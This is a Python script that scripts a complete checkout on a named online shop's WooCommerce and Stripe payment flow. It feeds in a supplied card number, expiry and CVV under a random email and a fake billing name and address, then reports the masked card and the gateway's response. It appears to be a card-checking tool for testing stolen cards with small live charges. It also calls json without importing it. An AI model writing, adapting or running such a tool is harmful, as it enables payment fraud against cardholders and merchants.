import requests
import re
import time
import random

def process_card_checkout(card_number, exp_month, exp_year, cvv):
    """Main function to process card checkout on epicalarc.com - returns raw response"""
    start_time = time.time()
    
    try:
        # Create a session to maintain cookies across requests
        session = requests.Session()
        
        # Add timeout to all requests
        timeout = 30
        
        # Generate random email
        email = f"user{random.randint(10000, 99999)}@gmail.com"
        
        # ========== STEP 1: ADD TO CART ==========
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'origin': 'https://www.epicalarc.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.epicalarc.com/shop/?orderby=price',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        params1 = {
            'wc-ajax': 'add_to_cart',
        }

        data1 = {
            'bsOriginalTitle': 'Add to cart',
            'price': '4.99',
            'product_name': 'Pumpkin Halloween Key Cap',
            'bsPlacement': 'top',
            'bsToggle': 'tooltip',
            'product_sku': 'EA202410499',
            'product_id': '10578',
            'quantity': '1',
        }

        # Add to cart
        try:
            response = session.post('https://www.epicalarc.com', 
                                  params=params1, headers=headers1, data=data1, timeout=timeout)
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Timeout: Add to cart failed",
                "status": 408,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # ========== STEP 2: GET PRODUCT PAGE ==========
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://www.epicalarc.com/shop/?orderby=price',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        try:
            response = session.get('https://www.epicalarc.com/product/pumpkin-halloween-key-cap/', 
                                 headers=headers2, timeout=timeout)
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Timeout: Product page load failed",
                "status": 408,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # Extract nonce for simulate cart
        match = re.search(r'wc-ajax=ppc-simulate-cart","nonce":"(.*?)"', response.text)
        if not match:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Could not find simulate cart nonce",
                "status": 500,
                "time_elapsed": round(time.time() - start_time, 2)
            }
        
        non = match.group(1)

        # ========== STEP 3: SIMULATE CART ==========
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-mobile': '?0',
            'origin': 'https://www.epicalarc.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.epicalarc.com/product/pumpkin-halloween-key-cap/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        params3 = {
            'wc-ajax': 'ppc-simulate-cart',
        }

        json_data = {
            'nonce': non,
            'products': [
                {
                    'id': '10578',
                    'quantity': '1',
                    'variations': None,
                    'extra': {},
                },
            ],
        }

        try:
            response = session.post('https://www.epicalarc.com', 
                                  params=params3, headers=headers3, json=json_data, timeout=timeout)
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Timeout: Simulate cart failed",
                "status": 408,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # ========== STEP 4: GET CHECKOUT PAGE ==========
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://www.epicalarc.com/product/pumpkin-halloween-key-cap/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        try:
            response = session.get('https://www.epicalarc.com/checkout/', 
                                 headers=headers4, timeout=timeout)
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Timeout: Checkout page load failed",
                "status": 408,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # Extract checkout nonce
        match = re.search(r'"checkout":"(.*?)"', response.text)
        if not match:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Could not find checkout nonce",
                "status": 500,
                "time_elapsed": round(time.time() - start_time, 2)
            }
        
        nonce = match.group(1)

        # Extract public key
        match = re.search(r'isUPEEnabled":"1","key":"(.*?)"', response.text)
        if match:
            pk = match.group(1)
        else:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Could not find Stripe public key",
                "status": 500,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # ========== STEP 5: CREATE STRIPE PAYMENT METHOD ==========
        headers5 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://js.stripe.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://js.stripe.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        data5 = {
            "billing_details[name]": "Happy Dappy",
            "billing_details[email]": email,
            "billing_details[phone]": "",
            "billing_details[address][city]": "new York",
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": "3111,New York,USA",
            "billing_details[address][line2]": "",
            "billing_details[address][postal_code]": "10019",
            "billing_details[address][state]": "NY",

            "type": "card",
            "card[number]": card_number,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,

            "allow_redisplay": "unspecified",
            "payment_user_agent": (
                "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; "
                "payment-element; deferred-intent"
            ),
            "referrer": "https://www.epicalarc.com",
            "time_on_page": "125592",

            "client_attribution_metadata[client_session_id]": "5a25707d-cf14-4e46-becf-2ba7ddf2dcd3",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": "bdeb85b1-fd9a-4b60-8147-3b3448cdf09a",
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",

            "guid": "NA",
            "muid": "NA",
            "sid": "NA",
            "key": pk,
            "_stripe_version": "2024-06-20"
        }

        try:
            stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                          headers=headers5, data=data5, timeout=timeout)
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Timeout: Stripe payment method creation failed",
                "status": 408,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # Extract payment method ID
        match_id = re.search(r'"id"\s*:\s*"([^"]+)"', stripe_response.text)
        if not match_id:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": f"Stripe payment method creation failed: {stripe_response.text[:500]}",
                "status": stripe_response.status_code,
                "time_elapsed": round(time.time() - start_time, 2)
            }
        
        pm_id = match_id.group(1)

        # ========== STEP 6: SUBMIT WOOCOMMERCE CHECKOUT ==========
        headers6 = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'origin': 'https://www.epicalarc.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.epicalarc.com/checkout/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        params6 = {
            'wc-ajax': 'checkout',
        }

        data6 = {
            # Order attribution
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "https://www.epicalarc.com/",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "(direct)",
            "wc_order_attribution_utm_medium": "(none)",
            "wc_order_attribution_utm_content": "(none)",
            "wc_order_attribution_utm_id": "(none)",
            "wc_order_attribution_utm_term": "(none)",
            "wc_order_attribution_utm_source_platform": "(none)",
            "wc_order_attribution_utm_creative_format": "(none)",
            "wc_order_attribution_utm_marketing_tactic": "(none)",
            "wc_order_attribution_session_entry": "https://www.epicalarc.com/shop/",
            "wc_order_attribution_session_start_time": "2026-01-11 12:21:21",
            "wc_order_attribution_session_pages": "9",
            "wc_order_attribution_session_count": "1",
            "wc_order_attribution_user_agent": (
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            ),

            # Billing
            "billing_email": email,
            "billing_first_name": "Happy",
            "billing_last_name": "Dappy",
            "billing_country": "US",
            "billing_address_1": "3111,New York,USA",
            "billing_address_2": "",
            "billing_city": "new York",
            "billing_state": "NY",
            "billing_postcode": "10019",
            "billing_phone": "",
            "account_password": "",

            # Shipping
            "shipping_first_name": "",
            "shipping_last_name": "",
            "shipping_country": "US",
            "shipping_address_1": "3111,New York,USA",
            "shipping_address_2": "",
            "shipping_city": "new York",
            "shipping_state": "NY",
            "shipping_postcode": "10019",

            # Order / shipping method
            "order_comments": "",
            "shipping_method[0]": "pickup_location:0",

            # Stripe / WooCommerce
            "payment_method": "stripe",
            "wc-stripe-payment-method-upe": "",
            "wc_stripe_selected_upe_payment_type": "",
            "wc-stripe-is-deferred-intent": "1",
            "woocommerce-process-checkout-nonce": nonce,
            "_wp_http_referer": "/?wc-ajax=update_order_review",
            "wc-stripe-payment-method": pm_id,
        }

        try:
            final_response = session.post('https://www.epicalarc.com', 
                                        params=params6, headers=headers6, data=data6, timeout=timeout)
        except requests.exceptions.Timeout:
            return {
                "success": False,
                "card": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "raw_response": "Timeout: Final checkout submission failed",
                "status": 408,
                "time_elapsed": round(time.time() - start_time, 2)
            }

        # Calculate total time
        total_time = round(time.time() - start_time, 2)
        
        # Clean up the raw response to remove HTML tags and extra spaces
        raw_response = final_response.text
        # Try to parse as JSON first
        try:
            response_json = final_response.json()
            if isinstance(response_json, dict):
                # Clean up messages if they exist
                if "messages" in response_json and response_json["messages"]:
                    # Remove HTML tags and extra whitespace
                    messages = response_json["messages"]
                    messages = re.sub(r'<[^>]+>', '', messages)  # Remove HTML tags
                    messages = re.sub(r'\s+', ' ', messages)  # Replace multiple spaces with single space
                    messages = messages.strip()
                    response_json["messages"] = messages
                raw_response = json.dumps(response_json)
        except:
            # If not JSON, just return as is
            pass
        
        # Return the response WITHOUT gateway field
        return {
            "success": True if final_response.status_code == 200 else False,
            "card": f"{card_number[:6]}******{card_number[-4:]}",
            "email": email,
            "raw_response": raw_response,
            "status": final_response.status_code,
            "time_elapsed": total_time
        }

    except Exception as e:
        return {
            "success": False,
            "card": f"{card_number[:6]}******{card_number[-4:]}",
            "email": "",
            "raw_response": f"Exception: {str(e)}",
            "status": 500,
            "time_elapsed": round(time.time() - start_time, 2) if 'start_time' in locals() else 0
        }


# Test function if run directly
if __name__ == "__main__":
    # Test the function
    result = process_card_checkout("4111111111111111", "04", "2025", "123")
    print("Test result:", json.dumps(result, indent=2))
